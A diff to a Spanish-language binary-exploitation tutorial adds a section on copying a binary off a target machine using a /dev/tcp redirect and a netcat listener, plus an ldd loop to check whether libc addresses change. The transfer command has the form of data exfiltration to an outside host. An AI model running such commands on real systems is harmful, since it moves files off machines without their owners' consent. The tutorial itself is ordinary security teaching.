@@ -21,11 +21,29 @@ habíamos habaldo antes si que son legibles como código de **Ensamblador** o le
 y si lo ves por primera vez, puede asustar un poco. Pero al final se trata de insutrcciones muy simples (que pasaré a explicar en otro post)
 
 ---------------------------------------------------------------------------
+
+## Compartir el binario
+
+```console
+[10.10.20.20]~$: cat < ./binario > /dev/tcp 10.10.10.10/443; md5sum bianrio 
+348235923523958  /opt/bianrio
+[cucuxii@parrot]~$: nc -nlvp 443 > binario; md5sum bianrio 
+348235923523958  /opt/bianrio  # Ver si coinciden (que no se haya modificado el binario por el camino)
+``` 
+
+---------------------------------------------------------------------------
+
 ## Conocer el binario
 
    ### Protecciones:
    Los binarios cuentan con varios tipos de protecciones disponibles, conocer estas es ideal para saber que tipo de ataque podríamos probar
    
+```console
+[cucuxii@parrot]~$: for i in $(seq 1 20); do ldd ./binario | grep libc | awk 'NF{print NF}' | tr-d '()'; done
+# Ver si cambian las direcciones de memoria
+``` 
+ 
+ 
 ---------------------------------------------------------------------------
 
 ## Objdump
